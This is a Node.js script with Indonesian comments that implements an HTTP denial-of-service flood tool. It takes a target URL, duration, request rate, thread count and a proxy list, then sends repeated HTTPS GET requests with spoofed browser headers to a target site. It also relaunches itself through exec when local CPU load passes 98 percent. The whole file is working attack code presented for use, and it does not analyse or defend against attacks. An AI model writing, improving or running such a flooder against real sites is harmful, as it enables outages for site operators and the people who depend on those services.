const https = require('https');
const fs = require('fs');
const { Worker, isMainThread, workerData } = require('worker_threads');
const { URL } = require('url');
const os = require('os');
const { exec } = require('child_process'); // Untuk mereset ulang proses

if (isMainThread) {
    if (process.argv.length < 7) {
        console.error("Usage: node script.js <url> <time> <rps> <threads> <proxy.txt>");
        process.exit(1);
    }

    const target = {
        url: process.argv[2],
        time: parseInt(process.argv[3], 10),
        rps: parseInt(process.argv[4], 10),
        threads: parseInt(process.argv[5], 10),
        proxyFile: process.argv[6]
    };

    console.log(`Starting attack on ${target.url} for ${target.time} seconds...`);
    const worker = new Worker(__filename, { workerData: target });
    worker.on('exit', () => console.log(`Attack on ${target.url} completed.`));
} else {
    const { url, time, rps, threads, proxyFile } = workerData;
    const target = new URL(url);
    const PROXY_LIST = proxyFile ? fs.readFileSync(proxyFile, 'utf-8').split('\n').filter(p => p.trim()) : [];

    const HTTP_OPTIONS = {
        hostname: target.hostname,
        port: target.port || 443,
        path: target.pathname,
        method: 'GET',
        headers: {
            'Host': target.hostname,
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 ' +
                          '(KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Connection': 'keep-alive',
            'Accept': '*/*',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'en-US,en;q=0.9',
            'Cache-Control': 'no-cache'  // Menambahkan header Cache-Control untuk mencegah caching
        }
    };

    function sendRequest() {
        const interval = setInterval(() => {
            // Cek penggunaan CPU setiap detik
            const cpuUsage = os.loadavg()[0]; // Mengambil load avg 1 menit
            const memoryUsage = process.memoryUsage().rss / 1024 / 1024; // Mengambil penggunaan memori dalam MB

            console.log(`CPU Load: ${cpuUsage.toFixed(2)} - RAM Usage: ${memoryUsage.toFixed(2)} MB`);

            // Jika penggunaan CPU lebih dari 98% (0.98 dari load average max 1)
            if (cpuUsage > 0.98 * os.cpus().length) {
                console.log("CPU usage exceeded 98%. Restarting the attack...");
                clearInterval(interval);
                exec('node ' + __filename + ' ' + process.argv.slice(2).join(' '), (error, stdout, stderr) => {
                    if (error) {
                        console.error(`exec error: ${error}`);
                        return;
                    }
                    console.log(`stdout: ${stdout}`);
                    console.error(`stderr: ${stderr}`);
                });
            }

            // Kirim permintaan sesuai dengan rps dan threads
            for (let i = 0; i < rps / threads; i++) {
                const req = https.request(HTTP_OPTIONS, res => {
                    res.on('data', () => {});
                });
                req.on('error', err => {});
                req.end();
            }
        }, 1000);

        // Menghentikan pengiriman request setelah waktu yang ditentukan
        setTimeout(() => clearInterval(interval), time * 1000);
    }

    // Mulai mengirim permintaan
    sendRequest();
}